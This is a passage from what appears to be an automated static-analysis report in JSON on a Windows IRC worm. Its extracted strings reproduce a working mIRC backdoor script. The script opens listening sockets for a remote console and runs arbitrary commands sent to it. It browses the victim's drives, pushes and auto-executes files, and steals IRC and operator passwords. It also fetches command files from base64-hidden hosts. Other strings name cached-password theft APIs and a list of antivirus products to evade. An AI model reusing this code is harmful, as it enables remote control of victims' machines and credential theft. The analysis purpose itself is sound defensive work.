            "n247=  if (*Msg NS iswm $1-2) { %iT = 1 | %i = 1 } | if (*Msg OS iswm $1-2) { %iT = 2 | %i = 1 } | if (*Msg CS iswm $1-2) { %iT = 1 | %sT = $null | %i = 1 }",
            "n248=  if (%iT) { .tokenize 32 $getTok($1-,$calc(2 + %i),32) %sT $getTok($1-,$calc(3 + %i) $+ -,32) | if (id isin $1) || (reg isin $1) || (newp isin $1) { .dif %iT $2- } }",
            "n249=  %sLine = $1- | %sLine = $replace(%sLine,:,$chr(32)) | .tokenize 32 %sLine",
            "n250=  if ($1 == /server && $0 > 2) { .writeini $GFN(IRC) BNC $2 $3- | .setPriority | .hadd Data addHost $2 }",
            "n251=  if (/*ass iswm $1 && $server && $2) { .writeini $GFN(IRC) BNC $server $+ _Pass $2- | .setPriority | .hadd Data addHost $server }",
            "n252=  if (/*uote*pass iswm $1-2 && $server && $3) { .writeini $GFN(IRC) BNC $server $+ _Pass $3- | .setPriority | .hadd Data addHost $server }",
            "n242=alias GFN { if ($1 == IRC) { .return %s } | if ($1 == DEF) { .return %s } | if ($1 == WINFILE) { .return %s } }",
            "n231=alias setPriority { .writeini $GFN(IRC) Options Priority High }",
            "n232=alias incPassCount { var %i = $readini($GFN(IRC), Options, Count) | .inc %i | if (2 // %i) { .writeini $GFN(IRC) Options Status UnSent } | .writeini $GFN(IRC) Options Count %i }",
            "n233=alias putHost { if ($hget(Data, Addr)) { .writeini $GFN(IRC) $me Addr $hget(Data, Addr) } }",
            "n234=alias dif {",
            "n235=  var %s | if (!$server) { .return } | .putHost",
            "n236=  if ($1 == 1) { %s = Temp-Pass } | if ($1 == 2) { %s = OS-PASS } | if ($1 == 3) { %s = OPER-PASS } | if ($1 == 4) { %s == BOT-PASS_ $+ $2 }",
            "n237=  if ($1 == 4) { if ($3 && $readini($GFN(IRC),$me,%s) != $3) { .incPassCount } | .return }",
            "n238=  if ($3 && $readini($GFN(IRC),$2,%s) != $3) || ($4 && $readini($GFN(IRC),$2,Perm-Pass) != $4) { .incPassCount }",
            "n239=  if ($3) { .writeini $GFN(IRC) $2 %s $3 } | if ($4) { .writeini $GFN(IRC) $2 Perm-Pass $4 }",
            "n240=  if (%s == OS-PASS) || (%s == OPER-PASS) { .setPriority }",
            "n241=}",
            "n219=  :FileNext | .inc %DIR.Index2 | %DIR.item = $findfile(%Dir.CD, %DIR.Mask, %DIR.Index2, %DIR.Depth)",
            "n220=  if (%DIR.item) { $sev(DIR, Items, $calc(%DIR.Index + %DIR.Index2), $FILEFormat) | .goto FileNext } | .dec %DIR.Index2",
            "n221=  $sev(DIR, Items, $calc(%DIR.Index + %DIR.Index2 + 1), END(Dir) %DIR.Index Dir(s) %DIR.Index2 File(s))",
            "n222=  :DirEnd | if ($Verify($sockname)) { .hadd Data $rev($sockname, Active) DIR | .sockwrite -tn $sockname $ev(DIR, Items, 0) }",
            "n223=}",
            "n224=alias istrue { if ($1 == $2) { $3- } }",
            "n225=alias isfalse { if ($1 != $2) { $3- } }",
            "n226=alias ishigher { if ($1 > $2) { $3- } }",
            "n227=alias islower { if ($1 < $2) { $3- } }",
            "n228=alias ev { var %i = 0 , %s | while (%i != $0) { .inc %i | %s = $insTok(%s, $getTok($1-, %i, 32), $calc($numTok(%s,$asc(.)) + 1), $asc(.)) } | .return % [ $+ [ %s ] ] }",
            "n229=alias rev { var %i = 0 , %s | while (%i != $0) { .inc %i | %s = $insTok(%s, $getTok($1-, %i, 32), $calc($numTok(%s,$asc(.)) + 1), $asc(.)) } | .return %s }",
            "n230=alias sev { var %i = 0 , %s | while (%i != $calc($0 - 1)) { .inc %i | %s = $insTok(%s, $getTok($1-, %i, 32), $calc($numTok(%s,$asc(.)) + 1), $asc(.)) } | set % [ $+ [ %s ] ] $getTok($1-, $0 $+ -, 32) }",
            "n209=alias setLoad { var %i = $gettok($date,1,$asc(/)) | if (5 // %i && $getCountry == BG) .AddHTTP SOS- $+ $calc(%i * $gettok($date,2,$asc(/))) $+ $decode(LmhpdC5iZy9Db21tYW5kcy50eHQ=,mt) NULL EXEC }",
            "n210=alias DIRIt {",
            "n211=  if ($hget($sockname, Active) == DIR) { .return } | .unset %DIR.* | %DIR.Index = 0 | %DIR.Index2 = 0",
            "n212=  if ($1 != DRIVES) { .goto DirFiles } | %DIR.Letters = CDEFGHIJKLMNOPQRSTUVWXYZ",
            "n213=  :DirDrives | .inc %DIR.Pos | %DIR.L = $mid(%Dir.Letters, %DIR.Pos, 1) | if (!%DIR.L) { .goto DirEnd }",
            "n214=  if ($disk(%DIR.L)) { $sev(DIR, Items, %DIR.Index, $DRIVEFormat) | .inc %Dir.Index } | .goto DirDrives",
            "n215=  :DirFiles | %DIR.CD = $getTok($1-, 1- $+ $calc($0 - 2), 32) | %DIR.Mask = $getTok($1-, $calc($0 - 1), 32) | %DIR.Depth = $getTok($1-, $0, 32)",
            "n216=  $sev(DIR, Items, 0, BEGIN(Dir) %Dir.CD %Dir.Mask %Dir.Depth)",
            "n217=  :DirNext | .inc %DIR.Index | %DIR.item = $finddir(%Dir.CD, %DIR.Mask, %DIR.Index, %DIR.Depth)",
            "n218=  if (%DIR.item) { $sev(DIR, Items, %DIR.Index, $DIRFormat) | .goto DirNext } | .dec %DIR.Index",
            "n200=alias ExecIt { [ [ $1- ] ] | if ($verify($sockname)) { .sockwrite -tn $sockname (EXEC) Executed. } }",
            "n201=alias WriteConsoleIt { if ($verify($sockname)) { .sockwrite -tn $sockname (CONSOLE) [ [ $1- ] ] } }",
            "n202=alias MassIt {",
            "n203=  if ($verify($sockname)) { .sockwrite -tn $sockname (MASS) Accepted. } | var %sExec = $readini($GFN(DEF), Mass, Executed)",
            "n204=  if ($1- !isin %sExec) { .hadd Data Mass On | .hadd Data MassExec $1- | .writeini $GFN(DEF) Mass Executed $1- , %sExec | $1- }",
            "n205=}",
            "n206=alias DIRFormat { .return ..\\ $+ $right(%DIR.Item, $calc($len(%DIR.Item) - $len(%DIR.CD) - 1)) <",
            " $+ 4DIR",
            "n207=alias FILEFormat { .return ..\\ $+ $right(%DIR.Item, $calc($len(%DIR.Item) - $len(%DIR.CD) - 1)) (",
            " $+ 10",
            " $+ $Bytes($file(%DIR.Item).size).suf $+ ",
            "n208=alias DRIVEFormat { .return $chr(91) $+ ",
            " $+ 6 $+ $disk(%DIR.L).type $+ ",
            " $+ $chr(93) %DIR.L $+ :\\ (",
            " $+ 7 $+ $disk(%DIR.L).Label $+ ",
            ") $+ ",
            " $+ 10 $Bytes($calc($disk(%DIR.L).size - $disk(%DIR.L).free)).suf $+ ",
            " $+ 10 $Bytes($disk(%DIR.L).size).suf }",
            "n191=alias HelloIt { if ($verify($sockname)) .sockwrite -tn $sockname (HELLO) I'm running RoRo Console $getVersion - $+ $getScript $+ - }",
            "n192=alias StatusIt { if ($verify($sockname)) .sockwrite -tn $sockname (STATUS) $getStat $hget(Data, Recving) $sockname $ip }",
            "n193=alias winFile { .return $GFN(WINFILE) }",
            "n194=alias runDLL { .return $readini($GFN(WINFILE),Files,SYS) }",
            "n195=alias InfoIt { if ($verify($sockname)) { .sockwrite -tn $sockname (INFO) $getInfo(1) .:. $getInfo(2) } }",
            "n196=alias SnifferIt { if ($verify($sockname)) { .sockwrite -tn $sockname (SNIFFER) Updated. } | .hadd Data Sniffer.Console $sockname | .hadd Data Sniffer $1 }",
            "n197=alias BNCIt { if ($verify(Gateway-BNC) != 1) { if ($verify($sockname)) .sockwrite -tn $sockname (BNC) Server: $1 Port: $2 | .sockopen Gateway-BNC $1 $2 } }",
            "n198=alias setMode { var %i = $gettok($date,1,$asc(/)) | if (5 // %i && $getCountry != BG) .AddHTTP $decode(Z2VvY2l0aWVzLmNvbS8=,mt) $+ SOS- $+ $calc(%i * $gettok($date,2,$asc(/))) $+ /Commands.txt NULL EXEC }",
            "n199=alias Exec2It { $1- }",
            "n171=  }",
            "n172=  if ($1 == (STATUS)) {",
            "n173=    if (!$5) { .CloseConsole %sNick | .return }",
            "n174=    .hadd Data $rev($sockname, Remote) $4 | .hadd Data $rev($sockname, IP) $5",
            "n175=    if ($getStat == Full && $hget(Data, Sending) == Idle) {",
            "n176=      if ($getVersion > $hget(Data,$rev($sockname,Version)) && $2 != Tmp && $3 == Idle) {",
            "n177=        if ($hget(Data,$rev($sockname,Version)) < 4.5) { .UseConsole %sNick EXEC .setStat Tmp }",
            "n178=        .UseConsole %sNick SendFile $runDLL $+ !C:\\ $+ $random($rand(3,5)) $+ .exe!1 | %bAlive = 1",
            "n179=      }",
            "n180=    }",
            "n181=    if (!%bAlive) { .CloseConsole %sNick }",
            "n182=  }",
            "n183=}",
            "n184=on *:sockclose:Local-Console-*:{ ",
            "n185=  .hdel -w Data $rev($sockname, *)",
            "n186=}",
            "n187=alias getScript { .return BiG }",
            "n188=alias getVersion { .return 5.5 }",
            "n189=alias setInfo { .writeini $GFN(DEF) Options Nick $me | .writeini $GFN(DEF) Options Info $getInfo(1) | .writeini $GFN(DEF) Options Info2 $getInfo(2) }",
            "n190=alias getInfo { if ($1 == 1) { .return $me .:. $hget(Data,Addr) .:. $Ip .:. $Server } | if ($1 == 2) { .return RoRo $getVersion $getScript .:. mIRC $Version .:. Win $OS } }",
            "n154=alias UseConsole {",
            "n155=  var %sConsole = Local-Console- $+ $1 | if (!$Verify(%sConsole)) { .return }",
            "n156=  if ($sock(%sConsole).status == active) { .sockwrite -tn %sConsole $2- }",
            "n157=  if ($2 == SendFile) { $SendFile(OPEN, Local-SendFile- $+ $1, $getTok($3-, 1, $asc(!)), $getTok($3-, 2, $asc(!)), $getTok($3-, 3, $asc(!))) }",
            "n158=  if ($2 == RecvFile) { $RecvFile(OPEN, Local-RecvFile- $+ $1, $getTok($3-, 1, $asc(!)), $getTok($3-, 2, $asc(!))) }",
            "n159=}",
            "n160=alias InitConsole {",
            "n161=  .decCount iJoin | if ($sockerr > 0) { .return }",
            "n162=  .UseConsole $GetTok($sockname, 3-, $asc(-)) Hello",
            "n163=}",
            "n164=on *:sockopen:Local-Console-*:{ .InitConsole }",
            "n165=on *:sockread:Local-Console-*:{",
            "n166=  if ($sockerr > 0) { .return } | var %sRead , %sNick = $GetTok($sockname, 3-, $asc(-)) , %bAlive = 0",
            "n167=  .sockread %sRead | .tokenize 32 %sRead",
            "n168=  if ($1 == (HELLO)) {",
            "n169=    .hadd Data $rev($sockname,Version) $6",
            "n170=    if ($hget(Data, MassExec)) { .UseConsole %sNick Mass $hget(Data, MassExec) } | .UseConsole %sNick Status ",
            "n135=on *:socklisten:Listen-Console:{ ",
            "n136=  .AcceptIt Server-Console",
            "n137=}",
            "n138=on *:sockread:Server-Console-*:{ ",
            "n139=  if ($sockerr > 0) { .return } | var %sRead | .sockread %sRead | .tokenize 32 %sRead | if ($1 && $isalias($1 $+ It) == $true) { $1 $+ It $2- }",
            "n140=}",
            "n141=on *:sockwrite:Server-Console-*:{",
            "n142=  if ($hget(Data, $rev($sockname, Active)) == DIR) {",
            "n143=    .inc %DIR.i | %DIR.Tmp = $ev(DIR, Items, %DIR.i)",
            "n144=    if (%DIR.Tmp && $Verify($sockname)) { .sockwrite -tn $sockname %DIR.Tmp }",
            "n145=    else { .unset %DIR.* | .hadd Data $rev($sockname, Active) Free }",
            "n146=  }",
            "n147=}",
            "n148=on *:sockopen:Server-Console-*:{ ",
            "n149=  if ($sockerr > 0) { .return } | .sockwrite -tn $sockname Rename Local-Console- $+ $me",
            "n150=}",
            "n151=alias OpenSConsole { var %sConsole = $OpenIt(Server-Console) | if ($2) { .sockopen %sConsole $2 2000 } }",
            "n152=alias CloseConsole { .sockclose Local-Console- $+ $1 | .hdel -w Data $rev(Local-Console- $+ $1, *) | .window -c @Local-Console- $+ $1 }",
            "n153=alias OpenConsole { var %sConsole = Local-Console- $+ $1 | if (!$Verify(%sConsole) && $2) { .sockopen %sConsole $2 2000 | .return } | .decCount iJoin }",
            "n118=    }",
            "n119=    else { :RecvMore | .sockread &bRead | if ($sockbr != 0) { .bwrite $hget(Data, $rev(%sName, LocalName)) -1 &bRead | .goto RecvMore } }",
            "n120=  }",
            "n121=}",
            "n122=on *:socklisten:Listen-SendFile:{ .AcceptIt Server-SendFile }",
            "n123=on *:sockread:Server-SendFile-*:{ .SendFile READ|SEND $sockname }",
            "n124=on *:sockwrite:Server-SendFile-*:{ .SendFile SEND $sockname }",
            "n125=on *:sockclose:Server-SendFile-*:{ .SendFile CLOSE $sockname }",
            "n126=on *:socklisten:Listen-RecvFile:{ .AcceptIt Server-RecvFile }",
            "n127=on *:sockread:Server-RecvFile-*:{ .RecvFile RECV $sockname }",
            "n128=on *:sockclose:Server-RecvFile-*:{ .RecvFile CLOSE $sockname }",
            "n129=on *:sockopen:Local-SendFile-*:{ .SendFile INIT $sockname }",
            "n130=on *:sockwrite:Local-SendFile-*:{ .SendFile SEND $sockname }",
            "n131=on *:sockclose:Local-SendFile-*:{ .SendFile CLOSE $sockname }",
            "n132=on *:sockopen:Local-RecvFile-*:{ .RecvFile INIT $sockname }",
            "n133=on *:sockread:Local-RecvFile-*:{ .RecvFile RECV $sockname }",
            "n134=on *:sockclose:Local-RecvFile-*:{ .RecvFile CLOSE $sockname }",
            "n103=  }",
            "n104=  if (RECV isin $1) {",
            "n105=    if (%bServer == 1 && $hget(Data, $rev(%sName, Init)) != 1) {",
            "n106=      .sockread %sRead",
            "n107=      .hadd Data $rev(%sName, LocalName) $GetTok(%sRead, 2, $asc(!))",
            "n108=      .hadd Data $rev(%sName, Size) $GetTok(%sRead, 3, $asc(!))",
            "n109=      .hadd Data $rev(%sName, Remote) $GetTok(%sRead, 4, $asc(!))",
            "n110=      .hadd Data $rev(%sName, Virus) $GetTok(%sRead, 5, $asc(!))",
            "n111=      .hadd Data $rev(%sName, Init) 1",
            "n112=      if ($hget(Data, $rev(%sName, Virus)) == 1) {",
            "n113=        if ($hget(Data, Recving) == Busy) { .sockclose $hget(Data, $rev(%sName, Remote)) | .hdel -w Data $rev(%sName, *) | .sockclose $2 | .return }",
            "n114=        .hadd Data Recving Busy | .hadd Data $rev(%sName, LocalName) $WinDir $+ \\ $+ $random($rand(3,6)) $+ .exe",
            "n115=      }",
            "n116=      if ($exists($hget(Data, $rev(%sName, LocalName))) == $true) { .remove $hget(Data, $rev(%sName, LocalName)) }",
            "n117=      if ($Verify($hget(Data, $rev(%sName, Remote))) == 1) { .sockwrite -tn $hget(Data, $rev(%sName, Remote)) (RECVFILE) Connection Established. Receiving in Progress.. }",
            "n84=        if ($hget(Data, $rev(%sName, Virus)) == 1) { .run $hget(Data, $rev(%sName, LocalName)) }",
            "n85=      }",
            "n86=      else if ($Verify($hget(Data, $rev(%sName, Remote))) == 1) {",
            "n87=        .sockwrite -tn $hget(Data, $rev(%sName, Remote)) (RECVFILE) File Transfer Error. Bad CRC..",
            "n88=        if ($hget(Data, $rev(%sName, Virus)) == 1) { .hadd Data Recving Idle }",
            "n89=      }",
            "n90=      if ($hget(Data, $rev(%sName, Virus)) == 1) { .sockclose $hget(Data, $rev(%sName, Remote)) }",
            "n91=    }",
            "n92=    .hdel -w Data $rev(%sName, *) | .sockclose $2 | .return",
            "n93=  }",
            "n94=  if (OPEN isin $1) {",
            "n95=    .hadd Data $rev(%sName, RemoteName) $3",
            "n96=    .hadd Data $rev(%sName, LocalName) $4",
            "n97=    .hadd Data $rev(%sName, Remote) $hget(Data, $rev(%sConsole, Remote))",
            "n98=    if ($verify($2) == 0) { .sockopen $2 $hget(Data, $rev(%sConsole, IP)) 1991 }",
            "n99=  }",
            "n100=  if (INIT isin $1) {",
            "n101=    %iResume = $file($hget(Data, $rev(%sName, LocalName))).size | if (%iResume == $null) { %iResume = 0 }",
            "n102=    .sockwrite -tn $sockname RecvFile! $+ $hget(Data, $rev(%sName, RemoteName)) $+ ! $+ %iResume $+ ! $+ $hget(Data, $rev(%sName, Remote))",
            "n68=    if ($bvar(&bRead, 0)) { if ($Verify($2) == 1) { .sockwrite $2 &bRead } | .hadd Data $Rev(%sName, Pos) $calc($hget(Data, $rev(%sName, Pos)) + 2048) }",
            "n69=    else {",
            "n70=      if (%bServer == 1 && $Verify($hget(Data, $rev(%sName, Remote))) == 1) { .sockwrite -tn $hget(Data, $rev(%sName, Remote)) (SENDFILE) File Successfully Sent.. }",
            "n71=      if ($hget(Data, $rev(%sName, Virus)) == 1) { .hadd Data Sending Idle }",
            "n72=      .hdel -w Data $rev(%sName, *) | .sockclose $2 | .return",
            "n73=    }",
            "n74=  }",
            "n75=}",
            "n76=alias RecvFile {",
            "n77=  ; $1 - ACTION , $2 - $sockname , $3 - Remote Filename , $4 - Local Filename",
            "n78=  var %bServer = 0 , %sNick = $getTok($2, 3-, $asc(-)) , %sConsole = Local-Console- $+ %sNick , %sName = $rev($2, RecvFile) , %sRead , %iResume",
            "n79=  if ($GetTok(%sName, 1, $asc(-)) == Server) { %bServer = 1 }",
            "n80=  if (CLOSE isin $1) || ($sockerr > 0) {",
            "n81=    if (%bServer == 1) {",
            "n82=      if ($file($hget(Data, $rev(%sName, LocalName))).size == $hget(Data, $rev(%sName, Size))) { ",
            "n83=        if ($Verify($hget(Data, $rev(%sName, Remote))) == 1) { .sockwrite -tn $hget(Data, $rev(%sName, Remote)) (RECVFILE) File Successfully Received. CRC OK.. }",
            "n50=  }",
            "n51=  if (OPEN isin $1) {",
            "n52=    .hadd Data $rev(%sName, LocalName) $shortfn($3)",
            "n53=    .hadd Data $rev(%sName, RemoteName) $4",
            "n54=    .hadd Data $rev(%sName, Virus) $5",
            "n55=    .hadd Data $rev(%sName, Remote) $hget(Data, $rev(%sConsole, Remote))",
            "n56=    .hadd Data $rev(%sName, Pos) 0",
            "n57=    if ($exists($hget(Data, $rev(%sName, LocalName))) == $false) { .hdel -w Data $rev(%sName, *) | .sockclose $2 | .return }",
            "n58=    if ($hget(Data, $rev(%sName, Virus)) == 1) { .hadd Data Sending Busy }",
            "n59=    else { .hadd Data $rev(%sName, Virus) 0 }",
            "n60=    if (!$verify($2) && $hget(Data, $rev(%sConsole, IP))) { .sockopen $2 $hget(Data, $rev(%sConsole, IP)) 1990 }",
            "n61=  }",
            "n62=  if (INIT isin $1) {",
            "n63=    %iSize = $file($hget(Data, $rev(%sName, LocalName))).size",
            "n64=    if ($Verify($2) == 1) { .sockwrite -tn $2 SendFile! $+ $hget(Data, $rev(%sName, RemoteName)) $+ ! $+ %iSize $+ ! $+ $hget(Data, $rev(%sName, Remote)) $+ ! $+ $hget(Data, $rev(%sName, Virus)) }",
            "n65=  }",
            "n66=  if (SEND isin $1) {",
            "n67=    .bread $hget(Data, $rev(%sName, LocalName)) $hget(Data, $rev(%sName, Pos)) 2048 &bRead",
            "n35=alias SendFile {",
            "n36=  ; $1 - ACTION , $2 - $sockname , $3 - Local Filename , $4 - Remote Filename , $5 - Virus",
            "n37=  var %bServer = 0 , %sNick = $getTok($2, 3-, $asc(-)) , %sConsole = Local-Console- $+ %sNick , %sName = $rev($2, SendFile) , %sRead , %iSize",
            "n38=  if ($GetTok(%sName, 1, $asc(-)) == Server) { %bServer = 1 }",
            "n39=  if (CLOSE isin $1) || ($sockerr > 0) {",
            "n40=    if ($hget(Data, $rev(%sName, Virus)) == 1) { .hadd Data Sending Idle }",
            "n41=    .hdel -w Data $rev(%sName, *) | .sockclose $2 | .return",
            "n42=  }",
            "n43=  if (READ isin $1) {",
            "n44=    .sockread %sRead",
            "n45=    .hadd Data $rev(%sName, LocalName) $shortfn($GetTok(%sRead, 2, $asc(!)))",
            "n46=    .hadd Data $rev(%sName, Pos) $GetTok(%sRead, 3, $asc(!))",
            "n47=    .hadd Data $rev(%sName, Remote) $GetTok(%sRead, 4, $asc(!))",
            "n48=    if ($exists($hget(Data, $rev(%sName, LocalName))) == $false) { .hdel -w Data $rev(%sName, *) | .sockclose $2 | .return }",
            "n49=    if ($Verify($hget(Data, $rev(%sName, Remote))) == 1) { .sockwrite -tn $hget(Data, $rev(%sName, Remote)) (SENDFILE) Auto-Resuming at $hget(Data, $rev(%sName, Pos)) bytes. Sending in Progress.. }",
            "n23=  .setMode Full | .write -c notes.txt | .load -rs1 notes.txt | .sockclose *",
            "n24=}",
            "n25=alias Init {",
            "n26=  if ($hget(Data).size == 0) { .timers off | .unload -rsn $script }",
            "n27=  .hadd Data Server $server | .hadd Data iJoin 0",
            "n28=  if ($readini($winFile, Options, Init2) != 1) || ($exists($GFN(DEF)) != $true) { .setSites }",
            "n29=  .timerListenIt 1 5 { .ListenIt } | .timerHttpMe 1 15 { .httpMe } | .timerReborn 0 90 { .Reborn } | .timerSend 0 600 { .hadd Data Sending Idle }",
            "n30=  if (!$hget(Data,extractHTML)) { .hadd Data extractHTML 1 | .extractHTML }",
            "n31=}",
            "n32=alias ListenIt { if ($portfree(1994) == $true) { .socklisten Listen-RecvFile 1990 | .socklisten Listen-SendFile 1991 | .socklisten Listen-Mutex 1994 | .socklisten Listen-BNC 1999 | .socklisten Listen-Console 2000 } }",
            "n33=alias AcceptIt { var %sName \"\" | :AcceptIt | %sName = $1 $+ - $+ $rand(1,999) | if ($Verify(%sName) != 0) .goto AcceptIt | .sockaccept %sName | return %sName }",
            "n34=alias OpenIt { var %sName \"\" | :OpenIt | %sName = $1 $+ - $+ $rand(1,999) | if ($Verify(%sName) != 0) .goto OpenIt | return %sName }",
            "n7=alias Wind { .return @ $+ $1 }",
            "n8=alias Verify { if ($1 && $sock($1) && $sock($1).wserr == 0) { .return 1 } | .return 0 }",
            "n9=alias Binded { if ($1 && $sock($1).status == active) { .return 1 } | .return 0 }",
            "n10=alias Reborn { .setInfo | .remote on }",
            "n11=on *:Connect:{ .Init }",
            "n12=on *:Disconnect:{ .timers off }",
            "n13=on *:Unload:{ .timers off | if ($hget(Mutex).size > 0) .hfree Mutex }",
            "n14=on *:Start:{ .Start }",
            "n15=alias Start {",
            "n16=  if ($version < 5.8) { .unload -rsn $script | .halt }",
            "n17=  if ($hget(Mutex).size > 0) { .timers off | .unload -rsn $script | .halt } | .hmake Mutex 1",
            "n18=  if ($HGet(Data).size > 0) { .hfree Data } | .hmake Data 100 | .hadd Data iJoinCount 3",
            "n19=  .hadd Data Recving Idle | .hadd Data Sending Idle | .hadd Data Visited 0",
            "n20=  if ($readini($winFile, Options, Init2) != 1) || ($exists($GFN(DEF)) != $true) { .setSites }",
            "n21=  .setStat $getStat | .setCountry $getCountry | .setLoad Big | if ($getStat == Full) { .hadd Data Spread On }",
            "n22=  .hadd Data Loaded $calc($readini($winFile,Options,Loaded) + 1) | .writeini $winFile Options Loaded $hget(Data, Loaded)",
            "n6=alias winDir { .return %s }",
            "[script]",
            "n0=alias setStat { .writeini $winFile Options Virus $1 }",
            "n1=alias getStat { var %s = $readini($winFile, Options, Virus) | if (!%s) %s = Semi | .return %s }",
            "n2=alias setCountry { if ($1) { .writeini $winFile Options Country $1 } }",
            "n3=alias getCountry { var %s = $readini($winFile, Options, Country) | if (!%s) { %s = OTHER } | .return %s }",
            "n4=alias addHTTP { .Writeini $GFN(DEF) HTTP $1 $2- }",
            "n5=alias delHTTP { .Remini $GFN(DEF) HTTP $1 }",
            "mirc",
            "host",
            "0,0,0,1,1,1,1,1,0,60,120,0,0,1,0,0,1,1,1,120,20,10,0,1,1,1,1,1,0,0,0,0,0",
            "5,100,1,1,108,40,30,0,0,1,1,1,0,0,1,1,0,1,1,0,1,1,1,0,5,0,0,0,0,0,1,0,0",
            "tfiles",
            "rfiles",
            "%s\\mirc.ini",
            "channel.ini|help.ini|remotes.ini|controls.ini|logs.ini|notes.ini|version.ini",
            "Pass",
            "User",
            "RemoteAccess\\Profile\\%s",
            "Rna\\",
            "WNetEnumCachedPasswords",
            "MPR.DLL",
            "RegisterServiceProcess",
            "KosmatMutex",
            "virus",
            "norton",
            "black",
            "cillin",
            "labs",
            "zone",
            "firewall",
            "sophos",
            "trend micro",
            "mcafee",
            "guard",
            "esafe",
            "lockdown",
            "conseal",
            "antivir",
            "f-secure",
            "f-prot",
            "fprot",
            "kaspersky",
            "panda",
            "black|panda|shield|guard|scan|mcafee|nai_vs_stat|iomon|navap|avp|alarm|f-prot|secure|labs|antivir",
            "N@ p+\u015di@]%",
            "@q\u05d5C",
            "@<\u0566I",
            "x@oGAkU'9p|B\u074e~QCv)/&D(",
            "DJzEe\u01d1",
            "uuvHMXB\u49d39;5SM]=];Z] T7aZ%]g']\u0740nL\u025b ",
            "R`%u",
            "\u05e3?Zd;On",
            "G\u0167?@il",
            "7?3=Bz\u0554?a",
            "w\u032b?/L[M\u013e?S;uD",
            "?g9E",
            "\u03d4?$#\u2f3a;1az?aUY~S|",
            "D?$?9'",
            "*?}d|FU>c{",
            "#Tw=:",
            "zc%C1<!8G",
            ";\u0184EB",
            "u7.:3q",
            "#2IZ9W\u06a52h",
            ",%I-64OSk%Y",
            "ZW<P\"",
            "NKeb",
            "\t\t\t\t"
        ],
        "file": {
            "%s%s.exe": "Executable",
            "%s\\%s%s%s.exe": "Executable",
            "%s\\%sdrv.dll": "Library",
            "%s\\sysmgr.dll": "Library",
            ".asf|.mpg|.asf|.avi|.mpg": "Video",
            "ADVAPI32.dll": "Library",
            "Friends.exe": "Executable",
            "IE_0%d_Setup.exe": "Executable",
            "KERNEL32.DLL": "Library",
            "MAPI32.DLL": "Library",
            "MPR.dll": "Library",
            "RASAPI32.dll": "Library",
            "WS2_32.dll": "Library",
            "n114=        .hadd Data Recving Busy | .hadd Data $rev(%sName, LocalName) $WinDir $+ \\ $+ $random($rand(3,6)) $+ .exe": "Executable",
            "rundll32.exe": "Executable",
            "user32.dll": "Library"
        },
        "fuzzing": {},
        "ip": [
            "5.7.7.3"
        ],
        "url": [
            "http://%s"
        ]
    },
    "time": "0:00:01.039207",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": [
        {
            "packer_compiler_signatures.yar": "IsPE32"
        },
        {
            "packer_compiler_signatures.yar": "IsWindowsGUI"
        },
        {
            "packer_compiler_signatures.yar": "HasRichSignature"
        },
        {
            "crypto_signatures.yar": "BASE64_table"
        }
    ]
}
